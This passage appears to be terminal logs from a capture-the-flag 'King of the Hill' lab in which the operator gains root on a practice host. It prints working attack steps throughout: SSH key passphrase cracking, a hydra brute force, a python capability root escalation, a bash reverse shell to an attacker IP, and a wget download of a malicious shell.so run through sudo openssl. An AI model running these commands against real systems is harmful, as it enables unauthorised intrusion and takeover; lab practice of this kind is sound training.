100% |******************************|  1766        1.80 MiB/s    00:00 ETA
226 Transfer complete.
1766 bytes received in 00:00 (8.72 KiB/s)
ftp> exit
221 Goodbye.

┌──(witty㉿kali)-[~/hackers_koth]
└─$ chmod 600 id_rsa 
                                                                           
┌──(witty㉿kali)-[~/hackers_koth]
└─$ ssh2john id_rsa > crawford_hash.txt
                                                                           
┌──(witty㉿kali)-[~/hackers_koth]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crawford_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chelsea12        (id_rsa)     
1g 0:00:00:00 DONE (2023-07-08 16:50) 3.030g/s 42375p/s 42375c/s 42375C/s frumusik..420247
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/hackers_koth]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa gcrawford@10.10.0.27  
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
Enter passphrase for key 'id_rsa': 
Last login: Wed Apr 29 19:32:48 2020 from 192.168.170.1

┌──(witty㉿kali)-[~/hackers_koth]
└─$ ssh -i id_rsa gcrawford@10.10.0.27 
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
Enter passphrase for key 'id_rsa': 
Last login: Sat Jul  8 20:51:13 2023 from 10.8.19.103
gcrawford@gibson:~$ sudo -l
[sudo] password for gcrawford:          
Sorry, try again.
[sudo] password for gcrawford:          
Sorry, try again.
[sudo] password for gcrawford:     
sudo: 3 incorrect password attempts
gcrawford@gibson:~$ ls
business.txt
gcrawford@gibson:~$ cat business.txt
Remember to send the accounts to Rich by 5pm Friday.

Remember to change my password, before the meeting with Mr Belford.
I hope he doesn't fire me. I need to provide for my family
I need to send Ben the flag too, thm{d8deb5f0526ec81f784ce68e641cde40}
gcrawford@gibson:~$ getcap -r / 2>/dev/null
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
gcrawford@gibson:~$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1003(gcrawford) groups=1003(gcrawford)


┌──(witty㉿kali)-[~]
└─$ hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.0.27 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect" -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-08 16:45:03
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://10.10.0.27:80/api/login:username=^USER^&password=^PASS^:Incorrect
[STATUS] 3076.00 tries/min, 3076 tries in 00:01h, 14341323 to do in 77:43h, 64 active
[STATUS] 3198.33 tries/min, 9595 tries in 00:03h, 14334804 to do in 74:42h, 64 active
[80][http-post-form] host: 10.10.0.27   login: plague   password: 111189
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-08 16:48:23

http://10.10.0.27/backdoor/shell/

=============================
=    daPlague's backdoor    =
=     Skiddies Keep Out     =
=============================
plague@gibson:$ /bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1

┌──(witty㉿kali)-[~/hackers_koth]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.0.27: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.0.27] 56068
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
production@gibson:~/webserver$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
production@gibson:~/webserver$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/production/webserver/server = cap_net_bind_service+ep
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
production@gibson:~/webserver$ sudo -l
sudo -l
Matching Defaults entries for production on gibson:
    env_reset, pwfeedback, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User production may run the following commands on gibson:
    (root) NOPASSWD: /usr/bin/openssl
production@gibson:~/webserver$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
id
uid=0(root) gid=1001(production) groups=1001(production)
# exit
exit
production@gibson:~/webserver$ sudo -l
sudo -l
Matching Defaults entries for production on gibson:
    env_reset, pwfeedback, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User production may run the following commands on gibson:
    (root) NOPASSWD: /usr/bin/openssl


┌──(witty㉿kali)-[~/Downloads]
└─$ locate shell.so   
/home/witty/Downloads/shell.so

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.0.27 - - [08/Jul/2023 17:00:19] "GET /shell.so HTTP/1.1" 200 -

production@gibson:~/webserver$ cd /tmp
cd /tmp
production@gibson:/tmp$ wget http://10.8.19.103:1234/shell.so
wget http://10.8.19.103:1234/shell.so
--2023-07-08 21:00:19--  http://10.8.19.103:1234/shell.so
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: ‘shell.so’

shell.so            100%[===================>]  13.82K  72.1KB/s    in 0.2s    

2023-07-08 21:00:20 (72.1 KB/s) - ‘shell.so’ saved [14152/14152]

production@gibson:/tmp$ chmod +x shell.so
chmod +x shell.so
production@gibson:/tmp$ sudo openssl req -engine ./shell.so
sudo openssl req -engine ./shell.so
root@gibson:/tmp# cd /root
cd /root
root@gibson:/root# ls
ls
king.txt  koth


```

Capture all 9 flags.

 Completed


[[One Piece]]